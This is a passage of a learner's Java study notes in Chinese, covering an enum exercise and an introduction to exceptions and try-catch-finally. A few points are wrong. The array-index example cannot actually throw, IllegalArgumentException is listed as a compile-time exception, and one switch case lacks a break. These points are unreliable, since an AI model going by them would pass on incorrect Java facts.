Air <span class="hljs-title function_">getAir</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Air</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="题目8-enum类"><a href="#题目8-enum类" class="headerlink" title="题目8 - enum类"></a>题目8 - enum类</h3><blockquote><p>枚举类<br>1.创建一个Color枚举类</p><p>2.有 RED，BLUE，BLACK，YELLOW，GREEN这个五个枚举值／对象；</p><p>3.Color有三个属性redValue， greenValue， blueValue，<br>4.创建构造方法，参数包括这三个属性，</p><p>5.每个枚举值都要给这三个属性赋值，三个属性对应的值分别</p><p>6.red:255，0，0 blue:0，0，255 black:0，0，0 yellow:255，255，0 green:0，255，0</p><p>7.定义接口，里面有方法show，要求Color实现该接口</p><p>8.show方法中显示三属性的值</p><p>9.将枚举对象在switch语句中匹配使用</p></blockquote><p>自写（和视频不同）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework08</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.print(<span class="hljs-string">&quot;输入想要查看的颜色：&quot;</span>);<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">color</span> <span class="hljs-operator">=</span> scanner.next();<br><span class="hljs-comment">//        String color = &quot;red&quot;;</span><br>        <span class="hljs-keyword">switch</span> (color)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;red&quot;</span>:<br>                Color.RED.show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;blue&quot;</span>:<br>                Color.BLUE.show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;black&quot;</span>:<br>                Color.BLACK.show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;yellow&quot;</span>:<br>                Color.YELLOW.show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;green&quot;</span>:<br>                Color.GREEN.show();<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">showColor</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">showColor</span>&#123;<br>    RED(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),BLUE(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">255</span>),<br>    BLACK(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),YELLOW(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0</span>),<br>    GREEN(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> redValue;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> greenValue;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> blueValue;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;redValue:&quot;</span>+redValue+<span class="hljs-string">&quot;\t&quot;</span>+<br>                <span class="hljs-string">&quot;greenValue:&quot;</span>+greenValue+<span class="hljs-string">&quot;\t&quot;</span>+<br>                <span class="hljs-string">&quot;blueValue&quot;</span>+blueValue);<br>    &#125;<br><br>    Color(<span class="hljs-type">int</span> redValue, <span class="hljs-type">int</span> greenValue, <span class="hljs-type">int</span> blueValue) &#123;<br>        <span class="hljs-built_in">this</span>.redValue = redValue;<br>        <span class="hljs-built_in">this</span>.greenValue = greenValue;<br>        <span class="hljs-built_in">this</span>.blueValue = blueValue;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getRedValue</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> redValue;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getGreenValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> greenValue;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getBlueValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> blueValue;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="章节十二-异常"><a href="#章节十二-异常" class="headerlink" title="章节十二 - 异常"></a>章节十二 - 异常</h1><h2 id="1-引入-异常捕获"><a href="#1-引入-异常捕获" class="headerlink" title="1.引入-异常捕获"></a>1.引入-异常捕获</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exception01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//num1 / num2 =&gt; 10/0</span><br>        <span class="hljs-comment">//抛出异常ArithmeticException</span><br>        <span class="hljs-comment">//程序崩溃，下面代码不再执行</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> num1/num2;<br>        System.out.println(<span class="hljs-string">&quot;程序继续运行....&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样的程序不好，不应该出现了一个不算致命的问题就导致整个系统崩溃。</p><p>所以java设计者，提供了 <strong>异常处理机制</strong> 来解决该问题。</p><p>如果程序员认为一段代码可能出现异常，可以使用<strong>try-catch</strong>异常处理机制来解决，从而保证程序的<strong>健壮性</strong>。</p><p>intelliJ IDEA中的Mac快捷键用法：⌘+⌥+T  （win为：CTRL+ALT+T） try-catch</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> num1/num2;<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    e.printStackTrace();<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;程序继续运行....&quot;</span>);<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221107104350300.png" alt="image-20221107104350300" style="zoom:50%;" /><h2 id="2-异常介绍"><a href="#2-异常介绍" class="headerlink" title="2.异常介绍"></a>2.异常介绍</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a><strong>基本概念</strong></h3><p>java语言中，将程序执行中发生的不正常情况称为“异常”。</p><p>（开发过程中的语法错误和逻辑错误不是异常）</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p><strong>执行过程中所发生的的异常事件可分为两大类：</strong></p><ol><li><p><strong>ERROR（错误）</strong>：Java虚拟机无法解决的严重错误。</p><p>如：JVM系统内部错误、资源耗尽等严重问题。</p><p>例如：StackOverflowError[栈溢出] 和 OOM(out of memory)。</p><p>Error是严重错误，程序会崩溃。</p></li><li><p><strong>EXCEPTION（异常）</strong>：其他因编程错误或偶然的外在因素导致的一般性问题。可以使用针对性的代码进行处理。</p><p>例如：空指针访问、试图读取不存在的文件。网络连接中断等等。</p><p>Exception分为<strong>两大类</strong>：<strong>运行时异常</strong>和<strong>编译时异常</strong>。</p><ul><li><strong>运行时异常</strong>：程序运行时，发生的异常</li><li><strong>编译时异常</strong>：编程时，编译器检查出的异常。</li></ul><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221107153226551.png" alt="image-20221107153226551" style="zoom:50%;" /></li></ol><h3 id="异常体系图"><a href="#异常体系图" class="headerlink" title="异常体系图"></a>异常体系图</h3><p>intelliJ IDEA 快捷键：</p><p>show Diagrams：⌥+⌘+⇧+U</p><p>show implementations：⌥+⌘+B</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108173934476.png" alt="image-20221108173934476"></p><p>绿色虚线表示这个类实现了这个接口。</p><p>如果是蓝色实线，则表示继承了这个类。</p><h3 id="五大运行时异常"><a href="#五大运行时异常" class="headerlink" title="五大运行时异常"></a>五大运行时异常</h3><p><strong>NullPointerException 空指针异常</strong></p><p><strong>ArithmeticException 数学运算异常</strong></p><p><strong>ArrayIndexOutOfBoundsException 数组下标越界异常</strong></p><p><strong>ClassCastExcption 类型转化异常</strong></p><p><strong>NumberFormatException 数字格式不正确异常</strong></p><ol><li><p><strong>NullPointerException 空指针异常</strong></p><p>应用程序试图在需要对象的地方使用null时抛出该异常。</p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    System.out.println(name.length());<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>ArithmeticException 数学运算异常</strong></p><p>当出现异常的运算条件时，抛出次异常。</p></li><li><p><strong>ArrayIndexOutOfBoundsException 数组下标越界异常</strong></p><p>用非法索引访问数组时，抛出的异常，如果索引为负或大于等于数组大小，则该索引为非法索引。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>    <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>        System.out.println(arr[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>ClassCastExcption 类型转化异常</strong></p><p>当试图将对象强制转换为不是实例的子类时，抛出该异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>(); <span class="hljs-comment">//向上转型</span><br>        <span class="hljs-type">B</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> (B)b;    <span class="hljs-comment">//向下转型，ok</span><br>        <span class="hljs-type">C</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> (C)b;    <span class="hljs-comment">//抛出异常</span><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>NumberFormatException 数字格式不正确异常</strong></p><p>当应用程序试图将字符串转换成一种数值类型，但该字符串不能转换为适当格式时，抛出该异常 &#x3D;&gt; 使用异常我们可以确保输入是满足条件数字。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;你好&quot;</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> Integer.parseInt(name);<br>    System.out.println(num);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="编译异常"><a href="#编译异常" class="headerlink" title="编译异常"></a>编译异常</h3><p>指在编译期间，就必须处理的异常，否则代码不能通过编译。</p><p><strong>常见的编译异常</strong></p><p>SQLException&#x2F;&#x2F;操作数据库时，查询表可能发生异常</p><p>IOException&#x2F;&#x2F;操作文件时，发生的异常</p><p>FileNotFoundException&#x2F;&#x2F;当操作一个不存在的文件时，发生异常</p><p>ClassNotFoundException&#x2F;&#x2F;加载类，而该类不存在时，异常</p><p>EOFException&#x2F;&#x2F;操作文件，到文件末尾，发生异常</p><p>lllegalArguementException&#x2F;&#x2F;参数异常</p><h3 id="课堂练习-1"><a href="#课堂练习-1" class="headerlink" title="课堂练习"></a>课堂练习</h3><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221107163049201.png" alt="image-20221107163049201"></p><p>以上代码是否正确，为什么？</p><p>左1）错误，数组下标越界异常。</p><p>左2）错误。算数异常。</p><p>右1）错误，空指针异常。</p><p>右2）错误。类型转换异常。</p><h2 id="3-异常处理"><a href="#3-异常处理" class="headerlink" title="3.异常处理"></a>3.异常处理</h2><h3 id="基本介绍-1"><a href="#基本介绍-1" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>当异常处理时，对异常处理的方式。</p><p><strong>处理方式：</strong></p><ol><li><p><strong>try-cathc-finally</strong></p><p>程序员在代码中捕获发生的异常，自行处理。</p></li><li><p><strong>throws</strong></p><p>将发生的异常抛出，交给调用者（方法）来处理，最顶级的处理者就是JVM。</p></li></ol><p><strong>示意图</strong></p><p><strong>t-c-f:</strong></p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221107164957355.png" alt="image-20221107164957355" style="zoom:50%;" /><p><strong>throws:</strong></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221107164929559.png" alt="image-20221107164929559"></p><h3 id="1-try-catch"><a href="#1-try-catch" class="headerlink" title="1.try-catch"></a>1.try-catch</h3><p> Java提供try和catch块来处理异常。try块用于包含可能出错的代码。catch块用于处理try块中发生的异常。可以根据需要在程序中有多个try…catch块。</p><p>基本语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>  <span class="hljs-comment">//可疑代码</span><br>  <span class="hljs-comment">//将异常生成对应的异常对象，传递给catch块</span><br>&#125;<span class="hljs-keyword">catch</span>(异常)&#123;<br>  <span class="hljs-comment">//对异常的处理</span><br>&#125;<span class="hljs-keyword">finally</span>&#123;<br>  <span class="hljs-comment">//不管是否发生异常，都执行某段代码</span><br>  <span class="hljs-comment">//释放资源等....</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>注意事项：</strong></p><p>1） 如果异常发生了，则异常发生后面的代码不会执行，直接进入到catch块．</p><p>2）如果异常没有发生，则顺序执行try的代码块，不会进入到catch.</p><p>3） 如果希望不管是否发生异常，都执行某段代码（比如关闭连接，释放资源等） 则使用如下代码－ finally ｛ ｝</p><p>4）可以有多个catch语句，捕获不同的异常（进行不同的业务处理），要求<strong>父类异常在后，子类异常在前。</strong></p><p>​比如（Exception 在后，NullPointerException 在前），如果发生异常，只会匹配一个catch。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TryCatchDetail</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>            System.out.println(person.getName()); <span class="hljs-comment">//NullPointException</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> n1 / n2; <span class="hljs-comment">//ArithmeticException</span><br>        &#125;<span class="hljs-keyword">catch</span> (NullPointerException e)&#123;<br>            System.out.println(<span class="hljs-string">&quot;空指针异常&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ArithmeticException e)&#123;<br>            System.out.println(<span class="hljs-string">&quot;算数异常&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(e.getMessage());;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jack&quot;</span>;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><blockquote><p>jack<br>算数异常</p></blockquote><p>5）可以进行 <strong>try-finally</strong> 配合使用，这种用法<strong>相当于没有捕获异常</strong>，因此程序会直接崩掉。</p><p>应用场景：不管是否发生异常，都必须执行某个业务逻辑。</p><h4 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h4><h5 id="题目1-2"><a href="#题目1-2" class="headerlink" title="题目1"></a><strong>题目1</strong></h5><p>输出什么，原因？</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108000733354.png" alt="image-20221108000733354" style="zoom:50%;" /><p>输出：4。</p><p>names[1].equals(“tom”) ，names[1]为null。所以是NullPointerException。</p><p>但finally里return了4，把3覆盖掉了。</p><p>所以返回4.</p><h5 id="题目2-2"><a href="#题目2-2" class="headerlink" title="题目2"></a>题目2</h5><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108001443174.png" alt="image-20221108001443174" style="zoom:50%;" /><p>输出：4.</p><h5 id="题目3-1"><a href="#题目3-1" class="headerlink" title="题目3"></a>题目3</h5><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221108001631339.png" alt="image-20221108001631339" style="zoom:50%;" /><p>输出：i &#x3D; 4, 3.</p><p>catch（NullPointerException）里的return输出3，但return无法立马输出，所以存储在临时变量temp中，最后再输出。</p><h5 id="题目4"><a href="#题目4" class="headerlink" title="题目4"></a>题目4</h5><p>如果用户输入的不是一个整数，就提示他反复输入，直到输入一个整数为止。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TryCatchExercise</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;请输入一个整数：&quot;</span>);<br>            <span class="hljs-keyword">try</span> &#123;<br>                num = Integer.parseInt(scanner.next());<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (NumberFormatException e) &#123;<br>                System.out.println(<span class="hljs-string">&quot;你输入的不是一个整数：&quot;</span>);;<br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;你输入的值是：&quot;</span>+num);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-throw"><a href="#2-throw" class="headerlink" title="2.throw"></a>2.throw</h3><p>1） 如果一个方法（中的语句执行时）可能生成某种异常，但是并<strong>不能确定如何处理这种异常</strong>，则此方法应显示地声明抛出异常，表明该方法将不对这些异常进行处理，而<strong>由该方法的调用者负责处理</strong>。<br>2） 在方法声明中用throws语句可以声明抛出异常的列表，throws后面的异常类型可以是方法中产生的异常类型，也可以是它的父类。</p><p><strong>注意事项：</strong></p><p>1） 对于编译异常，程序中必须处理，比如 try-catch 或者 throws</p><p>2）对于运行时异常，程序中如果没有处理，<strong>默认就是throws</strong>的方式处理</p><p>3）子类重写父类的方法时，对抛出异常的规定：子类重写的方法，所抛出的异常类型要<br>么和父类抛出的异常一致，要么为父类抛出的异常的类型的子类型</p><p>4）在throws 过程中，如果有方法 try-catch，就相当于处理异常，就可以不必 throws</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    f2();<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f2</span><span class="hljs-params">()</span>&#123;<br>   <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>   <span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>   <span class="hljs-type">double</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> n1/n2;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f1</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//f3() 报错</span><br>    <span class="hljs-comment">//1.因为f3() 方法抛出的是一个编译异常</span><br>    <span class="hljs-comment">//2.即这时，就要f1（），必须处理这个编译异常</span><br>    <span class="hljs-comment">//3.在f1()中，要么t-c-f，或者继续throw。</span><br>    f3();<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f3</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>    FileInputStream fis= <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;/Users/songyang/Desktop&quot;</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f4</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//在f4()中调用方法f5()不报错</span><br>    <span class="hljs-comment">//因为f5()抛出的是运行异常</span><br>    <span class="hljs-comment">//而java中，并不要求程序员显示处理，因为有默认处理机制</span><br>    f5();<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f5</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ArithmeticException&#123;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-自定义异常"><a href="#3-自定义异常" class="headerlink" title="3.自定义异常"></a>3.自定义异常</h3><p>当程序中出现了某些“错误”，但该错误信息并没有在Throwable子类中描述处理，这个时候可以自己设计异常类，用于描述该错误信息。</p><p><strong>自定义异常的步骤</strong>：</p><ol><li>定义类：自定义异常类名，继承Exception或RuntimeException</li><li>如果继承Exception，属于编译异常</li><li>如果继承RuntimeException，属于运行异常（一般选择）</li></ol><p><strong>例子：</strong></p><blockquote><p>当我们接收Person对象年龄时，要求范围在18-120之间，否则抛出一个<br>自定义异常（要求 继承RuntimeException），并给出提示信息。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 